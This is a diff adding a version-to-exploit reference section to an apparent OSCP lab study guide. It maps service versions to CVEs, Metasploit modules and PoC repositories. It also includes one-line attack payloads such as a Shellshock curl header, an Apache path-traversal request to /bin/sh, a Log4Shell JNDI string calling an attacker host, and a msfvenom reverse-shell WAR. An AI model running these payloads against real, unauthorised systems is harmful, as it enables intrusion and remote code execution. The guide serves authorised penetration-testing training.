@@ -3596,6 +3596,178 @@ When you meet an unknown port, work through these:
 
 ---
 
+# [VERSION-VULN-MAP]  "I see version X — is it exploitable, and WITH WHAT?"
+
+> **Why this section exists:** knowing "Redis ≥ 4.0" is useless if you don't know it's **RCE-able** and that a tool called **`redis-rogue-server`** exists. This is the missing half: for every service, the **vulnerable version → CVE/name → what you get → the EXACT tool/PoC and how to find it.** When `nmap -sCV` prints a version, come here.
+
+## 🧠 First — the META-METHOD (how you'd *ever* discover an exploit exists)
+You will meet versions not in this table. **This is the repeatable process** — it's how every entry below was found, and it's what you do in the exam:
+```bash
+# 1) searchsploit — your OFFLINE exploit database (this alone finds ~80% of version exploits)
+searchsploit <product>                 # e.g. searchsploit proftpd
+searchsploit <product> <major.minor>   # narrow:  searchsploit redis 4
+searchsploit -w <product>              # -w = show the exploit-db URL ; -m <id> = copy PoC locally ; -x <id> = read it
+# 2) nmap's own vuln scripts (names the CVE for you)
+nmap -p<port> --script vuln $IP
+nmap -p<port> --script "default,safe,version" $IP
+# 3) Google, in this exact shape (do this EVERY time):
+#      "<product> <version>" exploit
+#      "<product> <version>" rce github
+#      <product> <version> CVE
+#    → the top hits name the CVE AND link the PoC repo (that's how you learn "redis-rogue-server" exists)
+# 4) msfconsole search (even if you won't fire it — it names modules + CVEs):
+#      search <product>
+# 5) The CVE → PoC jump:  you have a CVE number → google  CVE-XXXX-YYYY github poc  → clone it → READ it → run it
+```
+**Rule of thumb:** a service banner with a version number is a *question*: "is THIS version exploitable?" You answer it with the 5 steps above — **never assume "probably patched."** Most lab boxes run the vulnerable version on purpose.
+
+> ⚠️ **Version strings lie (both ways).** (a) Distros **backport** security fixes while keeping the old version number — so a "vulnerable-looking" banner may be patched; always actually *try* the exploit. (b) Some patches (e.g. Redis CVE-2022-0543) **don't change the version string** — so a "safe-looking" banner may be vulnerable. The banner starts the hunt; the exploit result ends it.
+
+---
+
+## 🎯 THE CLASSIC BOX-KILLERS  (memorise these — they appear constantly on OSCP/PG/HTB)
+These are version-exact, unauthenticated, and usually = instant foothold or root. See one → go straight for it.
+
+| Service / banner | Vulnerable version | CVE / name | What you get | Tool / exact command |
+|---|---|---|---|---|
+| **vsftpd** | **2.3.4** | CVE-2011-2523 | **root shell** (backdoor) | login user ending `:)` opens port 6200 → `nc $IP 6200` then `id`. MSF: `exploit/unix/ftp/vsftpd_234_backdoor` |
+| **ProFTPD** | **1.3.5 / 1.3.5a** | CVE-2015-3306 (mod_copy) | **RCE** (write webshell via SITE CPFR/CPTO) | `searchsploit proftpd` → EDB-**36742** ; MSF `exploit/unix/ftp/proftpd_modcopy_exec` |
+| **ProFTPD** | **1.3.3c** | CVE-2010-3867 era backdoor | **root shell** | MSF `exploit/unix/ftp/proftpd_133c_backdoor` |
+| **Samba (usermap)** | **3.0.20 – 3.0.25rc3** | CVE-2007-2447 | **root RCE** (username map script) | MSF `exploit/multi/samba/usermap_script` (username = `/bin/bash` payload) |
+| **Samba (SambaCry)** | **3.5.0 → <4.4.14 / <4.5.10 / <4.6.4** | CVE-2017-7494 | **root RCE** (upload .so to a writable share → load) | MSF `exploit/linux/samba/is_known_pipename` |
+| **Windows SMB (EternalBlue)** | Win7 / 2008 / 2008R2 / (XP/2003) unpatched | **MS17-010** (CVE-2017-0144) | **SYSTEM RCE** | MSF `exploit/windows/smb/ms17_010_eternalblue` ; manual: github **worawit/MS17-010** (AutoBlue) ; check: `nmap --script smb-vuln-ms17-010` |
+| **Windows SMBv3 (SMBGhost)** | Win10 1903/1909, Server 1903/1909 | CVE-2020-0796 | **SYSTEM** (LPE reliable; RCE harder) | github **danigargu/CVE-2020-0796** ; check: `nmap --script smb-protocols` (SMB 3.1.1) |
+| **UnrealIRCd** (6667) | **3.2.8.1** | CVE-2010-2075 | **RCE** (backdoored tarball) | MSF `exploit/unix/irc/unreal_ircd_3281_backdoor` ; manual: `AB; <cmd>` |
+| **distcc** (3632) | any open distccd | CVE-2004-2687 | **RCE** as the distcc user | MSF `exploit/unix/misc/distcc_exec` |
+| **Rejetto HFS** (HttpFileServer) | **2.3 / 2.3a / 2.3b** | CVE-2014-6287 | **RCE** (Windows) | `searchsploit hfs` → EDB-**39161** ; MSF `exploit/windows/http/rejetto_hfs_exec` |
+| **Nostromo nhttpd** | **≤ 1.9.6** | CVE-2019-16278 | **RCE** (dir traversal) | `searchsploit nostromo` → EDB-**47837** ; MSF `exploit/multi/http/nostromo_code_exec` |
+| **Webmin** (10000) | **1.890 – 1.920** | CVE-2019-15107 | **unauth RCE as root** | MSF `exploit/linux/http/webmin_backdoor` ; EDB-**47293** (pipe `|` in old-password POST) |
+
+---
+
+## 📡 Per-service version → exploit tables
+
+### FTP (21)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| vsftpd 2.3.4 | CVE-2011-2523 | root backdoor (6200) | see classics above |
+| ProFTPD 1.3.5/1.3.5a | CVE-2015-3306 | RCE (mod_copy) | EDB-36742 / MSF proftpd_modcopy_exec |
+| ProFTPD 1.3.3c | backdoor | root | MSF proftpd_133c_backdoor |
+| Any FTP | — | anon login / upload to web root | `ftp $IP` → `anonymous` ; `put shell.php` |
+
+### SSH (22)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| OpenSSH **≤ 7.7** | CVE-2018-15473 | **username enumeration** (valid users → spray/brute) | `searchsploit openssh` → EDB-**45233** ; python PoC `ssh-username-enum` |
+| libssh **0.6 – 0.8.3** | CVE-2018-10933 | **auth bypass** (send SSH2_MSG_USERAUTH_SUCCESS) | github PoCs: `libssh-auth-bypass` ; MSF `auxiliary/scanner/ssh/libssh_auth_bypass` |
+| OpenSSH **8.5p1 – 9.7p1** (glibc) | CVE-2024-6387 **regreSSHion** | RCE as root (hard, niche) | github PoCs (very timing-dependent — rarely exam-relevant) |
+| any | — | **key reuse / found creds** → `ssh -i key user@IP` | SSH is usually the *payoff*, not the hole |
+
+### SMTP (25/465/587)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| Exim **4.87 – 4.91** | CVE-2019-10149 "Return of the WIZard" | **RCE as root** | `searchsploit exim` → EDB-**46974** ; local-priv-esc variant EDB-46996 |
+| OpenSMTPD **< 6.6.2** | CVE-2020-7247 | **RCE as root** | `searchsploit opensmtpd` → EDB-**47984** |
+| any | — | **user enumeration** (VRFY/EXPN/RCPT) | `smtp-user-enum -M VRFY -U users.txt -t $IP` |
+
+### DNS (53)
+| What | Gives | Tool |
+|---|---|---|
+| Zone transfer allowed | all internal records (hosts, AD) | `dig axfr @$IP domain.tld` / `fierce` |
+| dnsmasq < 2.78 | CVE-2017-14491 RCE/DoS | `searchsploit dnsmasq` (rare) |
+| any | subdomain/AD SRV discovery | see `[ENUM-DNS]` |
+
+### SMB (139/445)
+See **classics** (EternalBlue, SambaCry, usermap, SMBGhost). Also:
+| What | Gives | Tool |
+|---|---|---|
+| Null/guest session | shares, users, policy | `smbclient -L //$IP -N` ; `enum4linux-ng -A $IP` ; `nxc smb $IP -u '' -p ''` |
+| Writable share + `[ENUM-SMB]` | webshell / exe drop | `smbclient //$IP/share -N` → `put` |
+
+### RDP (3389)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| Win **XP–2008R2** unpatched | CVE-2019-0708 **BlueKeep** | **SYSTEM RCE** (unstable — can BSOD) | MSF `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` ; check `nmap --script rdp-vuln-ms12-020` |
+| any | — | creds → `xfreerdp /u:user /p:pass /v:$IP` | brute last resort: `hydra rdp://$IP` |
+
+### Redis (6379)  ← *your exact pain point*
+| Version / condition | CVE / name | Gives | Tool / how |
+|---|---|---|---|
+| **Any unauth** Redis | — | config write → **webshell / SSH key / cron** | `redis-cli -h $IP` → `config set dir ...` + `set` → write `authorized_keys` / cron / webshell. See `[ENUM-REDIS]` |
+| **≥ 4.0** unauth | module-load RCE | **direct command exec** | github **n0b0dyCN/redis-rogue-server** → `MODULE LOAD` → `system.exec "id"` / `system.rev`. (searchsploit redis) |
+| Debian/Ubuntu pkg (Lua) | CVE-2022-0543 | **RCE** (Lua sandbox escape) | github PoCs `CVE-2022-0543` ; works even when version *looks* patched (banner unchanged!) |
+> **How you'd find this in the exam:** `searchsploit redis` + google `"redis 4" rce github` → both name redis-rogue-server. The module-load trick is the headline Redis≥4 technique — now you know it exists.
+
+### MSSQL (1433)
+| Condition | Gives | Tool |
+|---|---|---|
+| Creds (or `sa`) | **RCE** via `xp_cmdshell` | `impacket-mssqlclient user:pass@$IP -windows-auth` → `enable_xp_cmdshell` → `xp_cmdshell 'whoami'` |
+| Service acct has SeImpersonate | → **SYSTEM** | land shell → PrintSpoofer/GodPotato `[POTATO-GOTCHAS]` |
+| Trusted links | pivot to other SQL as sa | `EXEC ... AT [LINKEDSRV]` |
+
+### MySQL / MariaDB (3306)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| MySQL **5.1.x<5.1.63 / 5.5.x<5.5.25** | CVE-2012-2122 | **auth bypass** (repeat login ~300×) | MSF `auxiliary/scanner/mysql/mysql_authbypass_hashdump` |
+| creds + FILE priv | **UDF RCE** (local root if run as root) | `raptor_udf2.c` → `lib_mysqludf_sys` → `sys_exec('...')` |
+| creds | loot `mysql.user` hashes, read files `LOAD_FILE()` | `mysql -h $IP -u user -p` |
+
+### PostgreSQL (5432)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| **9.3 – 11.2** (auth'd superuser) | CVE-2019-9193 | **RCE** as postgres user | `COPY cmd_exec FROM PROGRAM 'id';` ; MSF `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` |
+| any creds | read/write files, hashes | `psql -h $IP -U postgres` ; default creds `postgres:postgres` |
+
+### MongoDB (27017) / Oracle (1521)
+| What | Gives | Tool |
+|---|---|---|
+| MongoDB no-auth (default) | dump all DBs (creds/app data) | `mongosh --host $IP` → `show dbs` / `db.<c>.find()` |
+| Oracle TNS | SID + default creds → file write/RCE | `odat all -s $IP` (sidguesser→passwordguesser→utlfile/externaltable). See `[ENUM-ORACLE]` |
+
+### Elasticsearch (9200) / Memcached (11211)
+| Version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| ES **≤ 1.1** | CVE-2014-3120 | RCE (MVEL) | `searchsploit elasticsearch` → EDB-**33370** |
+| ES **1.3.0–1.3.7 / 1.4.0–1.4.2** | CVE-2015-1427 | RCE (Groovy sandbox) | EDB-**36337** |
+| ES any | — | dump indices for creds | `curl $IP:9200/_cat/indices` → `_search` |
+| Memcached | — | dump cached creds/sessions | `nc $IP 11211` → `stats items`/`cachedump`/`get` |
+
+### Tomcat / AJP / Java app servers (8080, 8009, 8443…)
+| Version / what | CVE / name | Gives | Tool |
+|---|---|---|---|
+| Tomcat AJP **<9.0.31/<8.5.51/<7.0.100** | CVE-2020-1938 **Ghostcat** | read WEB-INF (creds) → sometimes RCE | `searchsploit ghostcat` ; github **YDHCUI/CNVD-2020-10487** |
+| Tomcat Manager + creds | — | **RCE** (deploy .war) | `msfvenom -p java/jsp_shell_reverse_tcp -f war` → upload `/manager/text/deploy` (try `tomcat:tomcat`) |
+| JBoss | — | **RCE** (deploy/JMX) | `jexboss -u http://$IP:8080` |
+| Jenkins | Script Console / CVE-2024-23897 | **RCE** | `/script` → Groovy `"cmd".execute()` ; `searchsploit jenkins` |
+
+### Web apps / CMS  (always run after web enum)
+| Product + version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| **Apache httpd 2.4.49 / 2.4.50** | CVE-2021-41773 / CVE-2021-42013 | path traversal → **RCE** (if cgi/`require all granted`) | `curl --path-as-is "http://$IP/cgi-bin/.%2e/%2e%2e/bin/sh"` ; `searchsploit apache 2.4.49` |
+| **bash via CGI** (≤ 4.3) | CVE-2014-6271 **Shellshock** | **RCE** | `curl -H "User-Agent: () { :;}; /bin/bash -c 'id'" http://$IP/cgi-bin/<script>` ; `nmap --script http-shellshock` |
+| **OpenSSL 1.0.1–1.0.1f** | CVE-2014-0160 **Heartbleed** | memory leak (creds/keys) | `nmap --script ssl-heartbleed` ; `searchsploit heartbleed` |
+| **Drupal <7.58 / <8.5.1** | CVE-2018-7600 **Drupalgeddon2** | **unauth RCE** | github **dreadlocked/Drupalgeddon2** ; `searchsploit drupal` |
+| **log4j 2.0-beta9 – 2.14.1** | CVE-2021-44228 **Log4Shell** | **unauth RCE** (JNDI) | github **kozmer/log4j-shell-poc** ; inject `${jndi:ldap://KALI/x}` into any logged field |
+| **PHP-CGI <5.3.12/<5.4.2** | CVE-2012-1823 | **RCE** (query-string arg inject) | MSF `exploit/multi/http/php_cgi_arg_injection` |
+| **phpMyAdmin 4.8.0–4.8.1** | CVE-2018-12613 | LFI → RCE | `searchsploit phpmyadmin` → EDB-**44928** |
+| **Grav CMS ≤ 1.10.7** (admin) | CVE-2021-21425 | **unauth RCE** (YAML scheduler) | EDB-**49973** (`-u http://.../grav-admin/`). Box: Astronaut |
+| **Subrion ≤ 4.2.1** | CVE-2018-19422 | RCE (.phar upload) | EDB-**49876** / manual .phar. Box: Exfiltrated |
+| **SaltStack <2019.2.4/<3000.2** (4505/4506) | CVE-2020-11651/11652 | **unauth RCE as root** | github **jasperla/CVE-2020-11651-poc** → `--read`/`--exec`. Box: Twiggy |
+| **CUPS** (631 + UDP cups-browsed) | CVE-2024-4717x | unauth RCE (niche) | github **ippsec/evil-cups**. See `[ENUM-CUPS]` |
+| WordPress | plugin-specific | varies | `wpscan --url http://$IP -e vp,u --api-token <t>` → then searchsploit the plugin |
+
+### Remote-desktop / mgmt / misc
+| Service + version | CVE / name | Gives | Tool |
+|---|---|---|---|
+| RealVNC **4.1.1** | CVE-2006-2369 | **auth bypass** (type "none") | MSF `auxiliary/admin/vnc/realvnc_41_bypass` |
+| IPMI 2.0 (623/UDP) | CVE-2013-4786 | **hash dump pre-auth** → crack | MSF `auxiliary/scanner/ipmi/ipmi_dumphashes` → `hashcat -m 7300` |
+| rsync (873) no-auth | — | read/write files (keys, web root, `/`) | `rsync rsync://$IP/` → list → pull/push. See `[ENUM-RSYNC]` |
+| Telnet (23) | — | default/no creds, banner leak | `telnet $IP` ; reuse any pw on SSH |
+
+> 🔗 **Metasploit reminder (exam rule):** you may use MSF on **ONE** target only. For every entry above that names an MSF module, there is a `searchsploit`/github manual PoC alternative — prefer the manual one so you keep your single MSF use in reserve. The module name is still listed because it's the fastest way to *learn the CVE and confirm the version is the hole*.
+
+---
+
 # [ENUM-DECISION]  "Port X is open → go read this section"
 Use your Nmap results, then jump (Ctrl+F the tag):
 ```
@@ -3637,6 +3809,7 @@ Use your Nmap results, then jump (Ctrl+F the tag):
 11211 Memcached → [ENUM-MEMCACHED]
 anything else  → [ENUM-UNUSUAL-PORTS]
 ```
+> 🎯 **Got a version number from `-sCV`?** Don't guess if it's exploitable — go to **`[VERSION-VULN-MAP]`** (vulnerable version → CVE → what you get → the exact tool/PoC name + how to find it).
 
 ---
 *End Volume 1. Next: Volume 2 (Web & SQL Injection) — how to break the websites you just found.*
